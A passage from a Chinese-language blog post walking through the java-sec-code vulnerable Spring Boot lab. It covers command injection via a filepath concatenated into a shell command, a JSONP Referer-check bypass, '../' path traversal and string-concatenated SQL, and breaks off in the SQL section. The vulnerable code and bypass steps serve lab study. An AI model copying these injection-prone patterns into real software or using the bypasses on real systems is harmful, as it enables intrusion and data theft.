



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="网安" href="http://odiws.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="网安" href="http://odiws.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="网安" href="http://odiws.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">



  <title>
java-sec-code复现 |
zty153’s_blog = 网安 = web学习</title>
<meta name="generator" content="Hexo 7.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">java-sec-code复现
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2025-07-08 09:11:15">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2025-07-08T09:11:15+08:00">2025-07-08</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>41k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>37 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?510907"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?363039"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?882455"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?654893"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?839974"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?729372"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="ztyzty">
    <meta itemprop="description" content="web学习, 学无止境">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="网安">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="java-sec-code靶场复现"><a class="anchor" href="#java-sec-code靶场复现">#</a> java-sec-code 靶场复现：</h1>
<p>搭建：这是有个 springboot 项目，直接打开这个项目运行即可</p>
<p>记得配置配置文件 application.properties 这个文件的 jdbc 的账号和密码记得换成自己的账号密码</p>
<p>在配置文件周围有个 create_db.sql</p>
<p>记得先创建这个库，再是运行里面的内容</p>
<p>再是登录就是下面的页面</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081550679.png" alt="image-20250708154917318" /></p>
<h2 id="cmdinject"><a class="anchor" href="#cmdinject">#</a> Cmdinject</h2>
<h3 id="codeinject"><a class="anchor" href="#codeinject">#</a> /codeinject</h3>
<p>接下来就是复现这个漏洞了，审计源代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/codeinject"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">codeInject</span><span class="token punctuation">(</span><span class="token class-name">String</span> filepath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmdList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ls -la "</span> <span class="token operator">+</span> filepath<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">ProcessBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmdList<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        builder<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">Process</span> process <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">convertStreamToString</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这个是相关的代码：至于怎么知道的就是找这个路由是 / 从的 inject，源代码全局搜索就好了</p>
<p>里面有个类看一下构造函数：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081554563.png" alt="image-20250708155423524" /></p>
<p>可以发现他将我们的命令加入到 this.command 里面来了（是按 arraylist 储存起来），</p>
<p>执行了 redirectErrorStream 这个函数，看一下他的含义</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">ProcessBuilder</span> <span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> redirectErrorStream<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>redirectErrorStream <span class="token operator">=</span> redirectErrorStream<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>将 builder 自己的 redirectErrorStream 换成传入的参数</p>
<h4 id="start函数详解"><a class="anchor" href="#start函数详解">#</a> start（）函数详解：</h4>
<h5 id="1-把命令参数转换为字符串数组"><a class="anchor" href="#1-把命令参数转换为字符串数组">#</a> 1. 把命令参数转换为字符串数组</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmdarray <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>command<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cmdarray <span class="token operator">=</span> cmdarray<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>把用户传入的命令（通常是一个 List&lt;String&gt;）转换成数组形式，并且克隆一份，防止外部引用被修改（安全性考虑）。</li>
</ul>
<hr />
<h5 id="2-参数检查"><a class="anchor" href="#2-参数检查">#</a> 2. 参数检查</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> arg <span class="token operator">:</span> cmdarray<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>确保命令数组中的每个参数都不是  <code>null</code> ，否则抛出异常。</li>
</ul>
<hr />
<h5 id="3-获取要执行的程序名命令第一个元素"><a class="anchor" href="#3-获取要执行的程序名命令第一个元素">#</a> 3. 获取要执行的程序名（命令第一个元素）</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">String</span> prog <span class="token operator">=</span> cmdarray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>取数组的第一个元素作为要执行的程序或命令。</li>
</ul>
<hr />
<h5 id="4-安全管理器检查"><a class="anchor" href="#4-安全管理器检查">#</a> 4. 安全管理器检查</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">SecurityManager</span> security <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>security <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    security<span class="token punctuation">.</span><span class="token function">checkExec</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>如果有安全管理器，检查是否允许执行这个程序。</li>
<li>这是 Java 的安全策略部分，用于限制敏感操作。</li>
</ul>
<hr />
<h5 id="5-获取执行目录路径"><a class="anchor" href="#5-获取执行目录路径">#</a> 5. 获取执行目录路径</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">String</span> dir <span class="token operator">=</span> directory <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> directory<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>如果指定了工作目录，就转成字符串路径，否则为  <code>null</code> 。</li>
</ul>
<hr />
<h5 id="6-检查命令参数中是否含有非法的空字符"><a class="anchor" href="#6-检查命令参数中是否含有非法的空字符">#</a> 6. 检查命令参数中是否含有非法的空字符</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> cmdarray<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">'\u0000'</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"invalid null character in command"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ul>
<li>如果命令中包含空字符  <code>\0</code> ，抛出异常，这通常是非法命令参数。</li>
</ul>
<hr />
<h5 id="7-启动进程"><a class="anchor" href="#7-启动进程">#</a> 7. 启动进程</h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span> <span class="token class-name">ProcessImpl</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>cmdarray<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                             environment<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                             dir<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                             redirects<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                             redirectErrorStream<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ul>
<li>真正调用底层的  <code>ProcessImpl.start()</code>  方法启动进程，传入命令参数、环境变量、工作目录、重定向设置等。</li>
<li>如果启动失败，会捕获异常。</li>
</ul>
<hr />
<ol start="8">
<li>异常处理和安全相关异常信息屏蔽</li>
</ol>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">IOException</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> security <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        security<span class="token punctuation">.</span><span class="token function">checkRead</span><span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> se<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        exceptionInfo <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        cause <span class="token operator">=</span> se<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token string">"Cannot run program \""</span> <span class="token operator">+</span> prog <span class="token operator">+</span> <span class="token string">"\""</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token operator">+</span> <span class="token punctuation">(</span>dir <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token string">" (in directory \""</span> <span class="token operator">+</span> dir <span class="token operator">+</span> <span class="token string">"\")"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token operator">+</span> exceptionInfo<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    cause<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>如果启动失败，尝试用安全管理器判断是否有权限读取该程序文件，如果没有权限，则隐藏具体错误信息。</li>
<li>抛出一个新的  <code>IOException</code> ，包含更友好的错误描述。</li>
</ul>
<p>process.getInputStream () 函数返回一个 InputStream，用于读取子进程的标准输出（stdout）。返回的就是执行的结果</p>
<p>然后就是 WebUtils.convertStreamToString</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">convertStreamToString</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStream</span> is<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这个函数就是将其输出出来（使用了 scanner 类来读取 InputStream 类，让  <code>Scanner</code>  使用 <strong>输入开头</strong> ( <code>\A</code> ) 作为分隔符，这样整个流的内容会被当作一个整体读取（一次性读完整个流），s.next 返回整个输入流的字符串内容，如果流是空的返回 “”）</p>
<h3 id="codeinjecthost"><a class="anchor" href="#codeinjecthost">#</a> /codeinject/host</h3>
<p>差不多：只是将文件输入转成了 request 的 http 的 host 头了</p>
<p>但是发现用 bp 和 hackbar 都不行就离谱，只能用 curl 才能传，</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081637096.png" alt="image-20250708163749860" /></p>
<p>作者解释：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pveUNob3U5My9qYXZhLXNlYy1jb2RlL2lzc3Vlcy83OA==">https://github.com/JoyChou93/java-sec-code/issues/78</span></p>
<h2 id="jsonp"><a class="anchor" href="#jsonp">#</a> jsonp</h2>
<p>解释：前端目标：从其他域名请求数据（绕过同源策略）</p>
<p>浏览器限制 Ajax（比如 fetch/XMLHttpRequest）不能跨与调用 API，比如：</p>
<figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 这是不能跨域的</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://api.othersite.com/user"</span><span class="token punctuation">)</span>  <span class="token comment">// ❌ 被浏览器拦截</span></pre></td></tr></table></figure><p>・意思就是前端定义一手函数，包含怎么处理数据什么的，然后通过 script 标签回调一个函数，这样后端就会知道这个是 JSONP 数据，需要返回一个函数一个的数据，然后跟我前端定义的函数结构是一样的，前端就可以接受数据进行处理就行了</p>
<p>自动添加为 JSONP 代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@ControllerAdvice</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSONPAdvice</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractJsonpResponseBodyAdvice</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">JSONPAdvice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"callback"</span><span class="token punctuation">,</span> <span class="token string">"cback"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//callback 的参数名，可以为多个</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 java-sec-code 里面是</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Object2Jsonp</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractJsonpResponseBodyAdvice</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> callbacks<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger<span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// method of using @Value in constructor</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Object2Jsonp</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;joychou.security.jsonp.callback&#125;"</span><span class="token punctuation">)</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> callbacks<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">super</span><span class="token punctuation">(</span>callbacks<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Can set multiple paramNames</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>callbacks <span class="token operator">=</span> callbacks<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可以通过 AbstractJsonpResponseBodyAdvice 这个关键字寻找，得先找到 callback 的参数名字才行，就是 ${joychou.security.jsonp.callback} 这个</p>
<p>拿到这个函数，然后就是有个 security 的绕过，要求 referer 必要时 Joychou.org 并且得是 http/https 开头的，用</p>
<pre><code>Referer: https://joychou.org
</code></pre>
<p>绕过</p>
<p>其他的感觉太老了，没必要深究，了解其原理就好了</p>
<h2 id="文件上传"><a class="anchor" href="#文件上传">#</a> 文件上传：</h2>
<p>目前这类漏洞在 spring 里非常少，原因有两点：</p>
<ol>
<li>大多数公司上传的文件都会到 cdn</li>
<li>spring 的 jsp 文件必须在 web-inf 目录下才能执行</li>
</ol>
<p>除非，可以上传 war 包到 tomcat 的 webapps 目录。所以就不 YY 写漏洞了。</p>
<p>访问 <code>http://localhost:8080/file/</code>  进行文件上传，上传成功后，再访问 <code>http://localhost:8080/image/上传的文件名</code> 可访问上传后的文件。</p>
<h2 id="目录穿越"><a class="anchor" href="#目录穿越">#</a> 目录穿越</h2>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path_traversal/sec"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getImageSec</span><span class="token punctuation">(</span><span class="token class-name">String</span> filepath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span><span class="token function">pathFilter</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Illegal file path: "</span> <span class="token operator">+</span> filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"Bad boy. Illegal file path."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">getImgBase64</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>给了 filepath 文件地址，直接../ 加文件地址就有了<img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081920614.png" alt="image-20250708192005270" /></p>
<h2 id="sql注入"><a class="anchor" href="#sql注入">#</a> SQL 注入</h2>
<h4 id="raw-sql"><a class="anchor" href="#raw-sql">#</a> raw sql</h4>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 手拼 raw sql</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">Statement</span> statement <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from users where username = '"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td 